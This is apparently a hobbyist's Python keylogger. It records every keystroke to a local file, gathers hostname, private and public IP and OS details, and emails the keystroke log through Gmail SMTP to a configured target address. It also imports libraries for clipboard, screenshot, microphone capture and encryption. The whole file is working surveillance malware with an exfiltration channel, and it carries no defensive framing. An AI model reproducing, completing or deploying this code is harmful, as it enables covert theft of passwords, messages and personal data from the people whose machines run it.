# Import necessary libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time 
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from PIL import ImageGrab


# Define variables
keys_information = "key_log.txt"
email_address = "Your email address HERE"
password = "APP PASSWORD " 
toaddr = "Target email address"
file_path = "D:\\vscode\\python\\advanced_keylogger"  # File path
extend = "\\"
##system info
system_information="systeminfo.txt"

# now this is testing the code when new line or space is added to view better log of the file lets see if its working or not


# Email function for sending log files
def send_email(filename, attachment, toaddr):
    # Check if any of the arguments are None
    if filename is None or attachment is None or toaddr is None:
        raise ValueError("One or more of the arguments is null")

    # Set email sender
    fromadd = email_address
    msg = MIMEMultipart()
    msg['From'] = fromadd
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    # Set email body
    body = "body_of_the_email"
    msg.attach(MIMEText(body, "plain"))

    # Attach log file
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('content-Disposition', "attachment; filename=%s" % filename)
    msg.attach(p)

    # Connect to SMTP server and send email
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromadd, password)
    text = msg.as_string()
    s.sendmail(fromadd, toaddr, text)
    s.quit()
send_email(keys_information, file_path + extend + keys_information, toaddr)
##more variables
count = 0
keys = []
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP address: " + public_ip)

        except Exception:
            f.write("could not get public ip address")
        f.write("Processor:" + (platform.processor()) + '\n')
        f.write("System:" + platform.system() + " " + platform.version() + '\n')
        f.write("Machine:" + platform.machine() + "\n")
        f.write("Hostname" + hostname  + "\n")
        f.write("Private IP Address:"+ IPAddr + "\n")

computer_information()
#testing the new verison which si getting system informaiton


# Keylogger function
def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

# Write captured keys to file
def write_file(keys):
    if keys is None:
        raise ValueError("keys is null")
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('')
            elif k.find("enter")> 0:
                f.write('\n')
            elif k.find("key") == -1:
                f.write(k)
        f.close()

# Release function to stop the keylogger
def on_release(key):
    if key == Key.esc:
        return False

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
